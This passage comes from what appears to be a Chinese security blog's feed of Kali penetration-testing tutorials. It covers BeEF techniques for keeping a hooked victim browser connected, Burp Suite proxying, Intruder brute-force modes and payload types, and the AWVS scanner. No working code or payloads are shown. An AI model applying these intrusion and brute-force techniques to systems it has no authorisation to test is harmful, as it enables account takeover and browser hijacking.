src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204222316251.png" alt="image-20230204222316251"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204222909398.png" alt="image-20230204222909398"></p><h4 id="Persistence持久hook"><a href="#Persistence持久hook" class="headerlink" title="Persistence持久hook"></a>Persistence持久hook</h4><blockquote><p>当客户端关掉当前页面，此时的hook将失效；</p><p>一旦hook一个用户，第一时间创建持久hook</p></blockquote><h5 id="Create-Close-Tab"><a href="#Create-Close-Tab" class="headerlink" title="Create Close Tab"></a>Create Close Tab</h5><blockquote><p>如果客户端关闭当前页面，执行Create Close Tab后，客户端会显示一个confirm对话框；当客户端再次关闭当前页面还会显示confirm对话框</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223225740.png" alt="image-20230204223225740"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223211564.png" alt="image-20230204223211564"></p><h5 id="Create-Pop-Under"><a href="#Create-Pop-Under" class="headerlink" title="Create Pop Under"></a>Create Pop Under</h5><blockquote><p>执行此命令会在客户端出现新的窗口，并且beef页面会出现新的相同连接，新的连接是由小窗口直接建立连接</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223408304.png" alt="image-20230204223408304"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230204223501945.png" alt="image-20230204223501945"></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-Web渗透【神器】</title>
      <link href="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/"/>
      <url>/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h2><blockquote><ul><li>Web安全工具中的瑞士军刀</li><li>统一的集成工具发现全部现代WEB安全漏洞</li><li>PortSwigger公司开发<ul><li>Burp Free</li><li>Burp Professional</li><li><a href="http://www.portswigger.net/">http://www.portswigger.net</a></li></ul></li><li>所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息</li></ul></blockquote><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><ul><li>Options</li></ul><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130112927305.png" alt="image-20230130112927305"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130111708094.png" alt="image-20230130111708094"></p><blockquote><p>Redirect to host：客户端访问<a href="http://www.x.com域名,burpsuite就会转发到真实的目标web服务器ip地址(填写转发的真实服务器ip)/">www.x.com域名，Burpsuite就会转发到真实的目标web服务器IP地址（填写转发的真实服务器IP）</a></p><p>Redirect to port：Burpsuite转发到真实目标web服务器IP的目标端口</p><p>Invisible proxy：客户端程序不支持代理但需要走HTTP协议，为这样的客户端程序实现代理功能</p><p><strong>无论客户端支持或不支持代理；即使不支持代理的情况下，若访问同一个域名对应同一个IP还是多个域名对应多个IP的情况，都可以通过Burpsuite进行代理</strong></p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130121729367.png" alt="image-20230130121729367"></p><blockquote><p>截断服务器响应，默认拦截text文本类内容；若是拦截 其他内容可取消勾选</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130123913474.png" alt="image-20230130123913474"></p><blockquote><p>对返回内容的修改</p><ol><li>将隐藏的表单显示出来</li><li>将禁用掉的表单激活</li><li>移除输入表单的长度限制</li><li>禁用客户端浏览器JS</li><li>禁用所有JS（会影响一些功能）</li><li>禁用安全标签</li><li>将HTTPS链接转换为HTTP</li><li>移除cookie的安全标签</li></ol></blockquote><h3 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h3><blockquote><ul><li>Scope（logout）</li><li>Filter </li><li>Comparing site map</li></ul></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130122335853.png" alt="image-20230130122335853"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130122906421.png" alt="image-20230130122906421"></p><blockquote><p>浏览过的访问请求都会被记录在Site map中</p><p>也可以使用<code>Filter</code>功能进行过滤</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130122659247.png" alt="image-20230130122659247"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130122822816.png" alt="image-20230130122822816"></p><blockquote><p>其中也可以将需要的网站地址假如Scope方便后续操作，与OWASP_ZAP中的Scope相同</p><p>上面为Include，URL包含在scope中；下面为Exclude排除掉一些不需要的URL</p></blockquote><h3 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h3><blockquote><p>从Burpsuite2020开始Spider选项卡就没有了，可以使用隐藏的爬网功能</p></blockquote><ul><li>手动爬网</li></ul><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130210638762.png" alt="image-20230130210638762"></p><blockquote><p>可以手动点击网站任何可以提交数据的地方，Site map会自动爬取访问过的页面</p></blockquote><ul><li>自动爬网</li></ul><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130211106393.png" alt="image-20230130211106393"></p><ul><li>配置爬网信息</li></ul><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130211305634.png" alt="image-20230130211305634"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130211517633.png" alt="image-20230130211517633"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130211723246.png" alt="image-20230130211723246"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130211851158.png" alt="image-20230130211851158"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130212039704.png" alt="image-20230130212039704"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130212346054.png" alt="image-20230130212346054"></p><ul><li>爬取的结果</li></ul><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130214110279.png" alt="image-20230130214110279"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130214122574.png" alt="image-20230130214122574"></p><blockquote><p>其中爬取的结果可以在Site map中查看</p></blockquote><ul><li>爬取多次进行对比</li></ul><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130214441629.png" alt="image-20230130214441629"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130214456244.png" alt="image-20230130214456244"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130214937986.png" alt="image-20230130214937986"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130220953524.png" alt="image-20230130220953524"></p><blockquote><p>例如这是两个会话产生的爬网结果，其中可对比出两个会话那些是特有的，那些是一般会话访问不到的</p></blockquote><h3 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h3><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130221740826.png" alt="image-20230130221740826"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130221753797.png" alt="image-20230130221753797"></p><blockquote><p>根据需要配置Scan信息</p></blockquote><h3 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h3><blockquote><p>用来Fuzzer和暴力破解</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130224040087.png" alt="image-20230130224040087"></p><h4 id="四种攻击模式"><a href="#四种攻击模式" class="headerlink" title="四种攻击模式"></a>四种攻击模式</h4><ul><li><p>Sniper （狙击手）</p><blockquote><p>表示如果爆破点设置一个，simplelist如果是6个，就执行6次，如果爆破点设置两个，则执行12次，一般这个模式下只设置一个爆破点，因为如果用户名和密码都不知道的情况下不会使用该模式去爆破。通常用于在知道用户名后，对密码进行爆破。原理如下图所示：</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130225011792.png" alt="image-20230130225011792"></p></li><li><p>Battering ram（工程锤）</p></li></ul><blockquote><p>表示两个爆破点使用同一个play依次去执行，如果simplelist是6个，那么就执行6次。原理如下图所示：</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130225043111.png" alt="image-20230130225043111"></p><ul><li>pitch-fork（叉子）</li></ul><blockquote><p>这个模式下，表示两个爆破点，并且会设置两个payload1和payload2，payload1就设置给爆破点1，payload2就设置给爆破点2，总共也是执行6次。并且一般按照payload少的执行。</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130225115523.png" alt="image-20230130225115523"></p><ul><li>cluster bomb（集束炸弹）</li></ul><blockquote><p>表示如果有两个爆破点，同时设置两个payload1，和payload2，simplelist是6个和7个，那么就会执行一个笛卡尔积的次数。即就是42次。</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130225150990.png" alt="image-20230130225150990"></p><p>参考文章：</p><p><a href="https://blog.csdn.net/liweibin812/article/details/107428616">https://blog.csdn.net/liweibin812/article/details/107428616</a></p><h5 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h5><ul><li>Request Headers（请求头）</li></ul><blockquote><p>Update Content-Length header – 保证burpsuite在每次攻击的时候它的Content-Length是正确的</p><p>Set Connection: close - 保证burpsuite在每次攻击的时候它的每次请求连接是close，这样速度更快</p><p>上面两个参数默认就是勾选的，日常测试的过程中也是需要的</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130231049967.png" alt="image-20230130231049967"></p><ul><li>Grep Match（grep匹配响应信息中的关键字）</li></ul><blockquote><p>在进行暴力破解的时候，有些无法通过状态码或者长度判断出是都破解成功，这时候需要进行匹配关键字设置，通过配置特定的破解成功的关键字即可，需要取消勾选Exclude HTTP header。</p><p>主要是用来从服务端响应的信息中匹配攻击者设置好的关键字，如果匹配了，那么就在攻击的结果中添加新列并标明，这里最终的显示结果是新增的列下面每个攻击请求有个复选框，如果匹配上了就会打勾，否则就没有</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130225719977.png" alt="image-20230130225719977"></p><ul><li>Grep Extract（grep提取响应信息中的关键字，每行都显示）</li></ul><blockquote><p>用来从服务端响应的信息提取攻击者设置好的关键字信息，并且将有用的信息显示在每次攻击的请求列中显示，前提是有设置好的关键字，否则显示为空</p><p>Grep Payloads（提取响应信息中包含攻击时的payload的关键字）</p><p>​提取服务端响应的信息中是否包含Payload值</p><p>​PS：注意的是Match against pre-URL-encoded payloads，如果你在请求消息时配置了 URL-encode payloads 则这里表示匹配未编码之前的Payload值，而不是转码后的值。</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130231521664.png" alt="image-20230130231521664"></p><ul><li>Grep Payloads（提取响应信息中包含攻击时的payload的关键字）</li></ul><blockquote><p>提取服务端响应的信息中是否包含Payload值</p><p>​PS：注意的是Match against pre-URL-encoded payloads，如果你在请求消息时配置了 URL-encode payloads 则这里表示匹配未编码之前的Payload值，而不是转码后的值。</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130231658952.png" alt="image-20230130231658952"></p><ul><li>Redirections（重定向）</li></ul><blockquote><p>根据实际测试情况判断在攻击测试的时候是否需要重定向。</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130231730147.png" alt="image-20230130231730147"></p><h5 id="Payload-Type"><a href="#Payload-Type" class="headerlink" title="Payload Type"></a>Payload Type</h5><ul><li><p>Simple list（简单列表）</p><ul><li>自定义手工添加，Burpsuite默认列表手工添加，从剪贴板粘贴，从文件中加载</li></ul></li><li><p>Runtime file（运行时文件）</p><ul><li>直接选择一个文件加载进去即可</li></ul></li><li><p>Custom iterator（自定义迭代器）</p><ul><li>功能强大，有8个站位，每一个站位可以指定简单列表payload的类型，然后根据站位的多少，和每一个简单列表的payload进行笛卡尔积生成最终的payload，例如：有个参数值类型是username@@@password，那么就要设置3给站位</li></ul></li><li><p>Character substitution（字符串替换）</p><ul><li>根据预先定义好的字符串替换的规则，在payload执行的过程中按照规则匹配替换</li></ul></li><li><p>Case modification（大小写替换）</p><ul><li>根据预定义的大小写替换规则，在payload执行的过程中按照规则匹配替换，这期间经过规则生成的新payload是从上到下的顺序，依次是：No change(不改变使用原来的字符串)，To lower（转换为小写），To Upper case（转换为大写），To Propername（首字母大写，其他小写），To ProperName（首字母大写，其他不变）</li></ul></li><li><p>Recursive grep（递归grep）</p><ul><li>基于服务端响应的数据提取payload，然后使用提取的payload进行攻击，配置payload在options配置</li></ul></li><li><p>Illegal Unicode（非法的Unicode编码）</p><ul><li>在进行攻击的时候指定payload里面加入非法的Unicode编码，功能选项不太好理解</li></ul></li><li><p>Character blocks（字符块）– 可以理解为字符长度</p><ul><li>根据要求给出的一个字符串，然后指定设置产生指定大小的字符块，最终的结果展示为生成指定长度的字符串，一般用在边界测试或者缓冲区溢出中</li></ul></li><li><p>Number（数字类型）</p><ul><li>数字范围：根据要求生成序列数字，随机数字</li><li>数字格式：</li><li>十进制：</li><li>Min integer digits -&gt; 最小的整数个数有几个，简单点理解就是小数点前面最少有几位数</li><li>Max integer didits -&gt; 最大的整数个数有几个，简单点理解就是小数点前面最多有几位数</li></ul></li><li><p>Date（日期类型）</p><ul><li>根据要求生成一序列各种格式的日期</li></ul></li><li><p>Brute Forcer（暴力破解）</p><ul><li>生成一个包含特定字符集的排列组合，一般都是用来穷尽账号密码用途</li></ul></li><li><p>Null payloads（空payload）</p><ul><li>在每个请求中添加null，实际查看就是没有更改原始请求重复发送给服务端</li></ul></li><li><p>Character frobber（字符frobber）</p><ul><li>依次修改字符串中每个字符位置的值，每次都是在原来的字符串上递增一个该字符的ASCII码，通常使用的场景是目标系统使用了负载的会话令牌用来跟踪会话，如果修改了其中单个字符的值，不影响会话的下一步处理</li></ul></li><li><p>Bit flipper（Bit翻转）</p><ul><li>对预设的payload原始值按照比特位的形式依次修改</li></ul></li><li><p>Username generator（用户名生成器）</p><ul><li>主要用于用户名和电子邮件账号的自动生成</li></ul></li><li><p>ECB block shuffler（ECB加密块洗牌）</p><ul><li>基于ECB加密模式的Payload生成器</li></ul></li><li><p>Extension-generated（payload扩展插件生成）</p><ul><li>基于Burp插件来生成Payload值，因此使用前必须安装配置Burp插件，在插件里注册一个Intruder</li><li>payload生成器，供此处调用，这里测试安装的插件是Bradamsa</li></ul></li><li><p>Copy other payload（复制其他的payload）</p><ul><li>这种类型的Payload是将其他位置的参数复制到Payload位置上，作为新的Payload值，通常适用于多个参数的请求消息中，它的使用场景可能是： 1.两个不同的参数需要使用相同的值，比如说，用户注册时，密码设置会输入两遍，其值也完全一样，可以使用此Payload类型。 2.在一次请求中，一个参数的值是基于另一个参数的值在前端通过脚本来生成的值，可以使用此Payload类型</li></ul></li></ul><p>文章来源：</p><p><a href="https://www.jianshu.com/p/fd0e0fdb9245">https://www.jianshu.com/p/fd0e0fdb9245</a></p><h3 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h3><blockquote><p>重放模块，用于多次重放请求、响应和手工修改请求消息，以及修改后对服务器端响应的消息分析</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130232427218.png" alt="image-20230130232427218"></p><ul><li>右键根据需要选择</li></ul><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130232453945.png" alt="image-20230130232453945"></p><h3 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h3><blockquote><p>用于检测数据样本随机性质量的工具，通常用于检测访问令牌是否可预测、密码重置令牌是否可预测等场景，通过Sequencer不断发包，抓取对应的token值等等，对这些随机令牌的样本，进行数据分析，能很好地降低这些关键数据被伪造的风险。</p><ul><li>分析程序中可预测的数据<ul><li>Session cookies</li><li>anti-CSRF tokens</li><li>Start live capture<ul><li>Analyze（数据越多分析越准确）</li><li>伪随机算法</li><li>Character-level</li><li>Bit-level</li></ul></li></ul></li><li>FIPS—美国联邦信息处理标准(Federal Information Processing Standard)</li></ul></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230130234145889.png" alt="image-20230130234145889"></p><h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><blockquote><ul><li><p><strong>ACUNETIX WEB VULNERABILITY SCANNER</strong></p></li><li><p>自动手动爬网。支持AJAX，JavaScript</p></li><li><p>AcuSensor灰盒测试</p><ul><li>发现爬网无法发现文件</li><li>额外的漏洞扫描</li><li>可发现存在漏洞的源码行号</li><li>支持PHP、.NET（不获取源码的情况下注入已编译.NET）</li></ul></li><li><p>生成PCL、27001标准和规报告</p><ul><li>生成给不同级别的人看的报告</li></ul></li><li><p>网络扫描</p><ul><li>FTP、DNS、SMTP、IMAP、POP3、SSH、SNMP、Telnet</li><li>集成openvas扫描漏洞</li></ul></li></ul></blockquote><h3 id="自动爬网"><a href="#自动爬网" class="headerlink" title="自动爬网"></a>自动爬网</h3><ul><li>Overview</li></ul><blockquote><p>查看扫描总体结果</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131102432622.png" alt="image-20230131102432622"></p><ul><li>Discovery</li></ul><blockquote><p>发现功能，可以自定义配置Settings：匹配email、Website等信息；Inclusions：可添加需要发现IP、组织信息和域名；Exclusions：排除不需要发现的IP、组织信息和域名</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131102616241.png" alt="image-20230131102616241"></p><ul><li>Targets</li></ul><blockquote><p>目标功能，添加扫描信息以及描述，也可以添加Target Group进行扫描</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131103113343.png" alt="image-20230131103113343"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131103139369.png" alt="image-20230131103139369"></p><ul><li>Scans</li></ul><blockquote><p>扫描功能，添加&#x2F;删除新的扫描，以及扫描完成之后自动生成Report；Report可以根据需要生成特定的报告，也可以查看Report Templates了解详细信息</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131111450502.png" alt="image-20230131111450502"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131111538725.png" alt="image-20230131111538725"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131111702344.png" alt="image-20230131111702344"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131111826771.png" alt="image-20230131111826771"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131111929939.png" alt="image-20230131111929939"></p><blockquote><p>配置扫描信息</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131104849888.png" alt="image-20230131104849888"></p><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131105025680.png" alt="image-20230131105025680"></p><ul><li>Vulunerabilities</li></ul><blockquote><p>扫描出的漏洞可以在Vulunerabilities中进行查看，危害级别，漏洞类型，以及URL等信息；其中Export也可以导出Web应用防火墙（WAF）支持的格式；生成漏洞报告等</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131105423142.png" alt="image-20230131105423142"></p><ul><li>Scan Profiles</li></ul><blockquote><p>扫描配置，其中包含了AWVS默认的几个扫描配置，也可以自定义扫描配置</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131110051520.png" alt="image-20230131110051520"></p><ul><li>Network Scanner Settings</li></ul><blockquote><p>AWVS还支持网络扫描，可配置目标IP，目标Port，身份认证的用户名和密码以及需要使用的Protocol</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131110223375.png" alt="image-20230131110223375"></p><ul><li>Issue Trackers</li></ul><blockquote><p>问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等</p></blockquote><p><img src="/2023/01/30/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E7%A5%9E%E5%99%A8%E3%80%91/image-20230131110709746.png" alt="image-20230131110709746"></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-Web渗透【扫描工具】</title>
      <link href="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/"/>
